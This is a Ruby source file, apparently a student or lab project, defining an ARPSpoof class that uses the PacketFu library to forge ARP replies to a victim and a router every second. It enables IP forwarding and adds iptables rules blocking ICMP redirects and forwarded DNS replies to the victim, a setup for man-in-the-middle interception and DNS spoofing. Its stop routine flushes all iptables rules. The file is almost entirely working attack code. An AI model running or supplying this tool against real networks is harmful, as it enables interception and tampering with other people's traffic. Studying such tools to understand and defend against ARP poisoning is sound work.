#!/usr/bin/env ruby

#-------------------------------------------------------------------------------
# arp.rb
#
# ARP Spoofing Class
#
# Author: Jivanjot Brar & Shan Bains
#
# Functions:
# initialize - initialize the class
# send - sends spoof packets
# start - start spoofing
# stop - stop spoofing
#
#-------------------------------------------------------------------------------
require 'rubygems'
require 'packetfu'

=begin
  This class handles the ARP poison part of the application. It is designed to
  send out spoofed ARP packets in order to poison the Victim's and Router's ARP
  cache. The Packets are sent every second. This class should be run in its own
  process or a thread and remotely killed when it is no longer needed.
=end
class ARPSpoof
    
    #---------------------------------------------------------------------------
    # initialize
    #
    # class Constructor, creates and arp packet and stores the global data, gets called
    # when ArpPoison object is created
    #
    # victim_ip - Victim's IP Address
    # victim_mac - Victim's MAC Address
    # gateway - gateway IP address (router's address)
    # iface - NIC Device (default = "em1")
    # spoof - true to start spoofing, false to not start (default = false)
    #---------------------------------------------------------------------------
    def initialize(victim_ip, victim_mac, gateway, router_mac,
                   iface = "em1", 
                   spoof = false)
                   
      @victim_ip = victim_ip  
      cfg = PacketFu::Utils.whoami?(:iface => iface) 
        
        @victim_packet = PacketFu::ARPPacket.new
        @router_packet = PacketFu::ARPPacket.new
        @iface = iface
        
        # Make the victim packet
        @victim_packet.eth_saddr = cfg[:eth_saddr]            # our MAC address
        @victim_packet.eth_daddr = victim_mac                 # the victim's MAC address
        @victim_packet.arp_saddr_mac = cfg[:eth_saddr]        # our MAC address
        @victim_packet.arp_daddr_mac = victim_mac             # the victim's MAC address
        @victim_packet.arp_saddr_ip = gateway                 # the router's IP
        @victim_packet.arp_daddr_ip = victim_ip               # the victim's IP
        @victim_packet.arp_opcode = 2                         # arp code 2 == ARP reply

        # Make the router packet
        @router_packet.eth_saddr = cfg[:eth_saddr]            # our MAC address
        @router_packet.eth_daddr = router_mac                 # the router's MAC address
        @router_packet.arp_saddr_mac = cfg[:eth_saddr]        # our MAC address
        @router_packet.arp_daddr_mac = router_mac             # the router's MAC address
        @router_packet.arp_saddr_ip = victim_ip               # the victim's IP
        @router_packet.arp_daddr_ip = gateway                 # the router's IP
        @router_packet.arp_opcode = 2                         # arp code 2 == ARP reply
        
        # Start spoofing if start is true
        if spoof then
            poison
        end # if
        
    end # initialize
    
    #---------------------------------------------------------------------------
    # send
    #
    # packet - packet to send
    # interface - interface to the send the packet on
    #
    # send spoof packets
    #
    #---------------------------------------------------------------------------    
    def send(packet, interface)
        packet.to_w(interface)
    end # send(packet, interface)
    
    #---------------------------------------------------------------------------
    # start
    #
    # Start ARP poisoning to the target machine
    #
    #---------------------------------------------------------------------------
    def poison
        puts "ARP Poisoning starting... \n"
        if @running then
            puts "Already running another instance of ARP Poisoning"
            return
        end
        @running = true
        
        # Enable Forwarding
        `echo 1 > /proc/sys/net/ipv4/ip_forward`
        
        # Prevent ICMP Redirect from coming out of attacker's machine
        `iptables -A OUTPUT -p ICMP --icmp-type 5 -d #{@victim_ip} -j DROP`
	`iptables -A FORWARD -p udp --sport 53 -d #{@victim_ip} -j DROP`
        
        while(@running)
            sleep 1
            send(@victim_packet, @iface)
            send(@router_packet, @iface)
        end # while
    end # start
    
    #---------------------------------------------------------------------------
    # stop
    #
    # Stop ARP poisoning
    #
    #---------------------------------------------------------------------------
    def stop
        @running = false
        
        # Disable Forwarding
        `echo 0 > /proc/sys/net/ipv4/ip_forward`
        
        # Delete rule
        #`iptables -D OUTPUT -p ICMP --icmp-type 5 -j DROP` 
	
        `iptables -D OUTPUT -p ICMP --icmp-type 5 -d #{@victim_ip} -j DROP`
	`iptables -D FORWARD -p udp --sport 53 -d #{@victim_ip} -j DROP`
	`iptables -F`
    end # stop
end
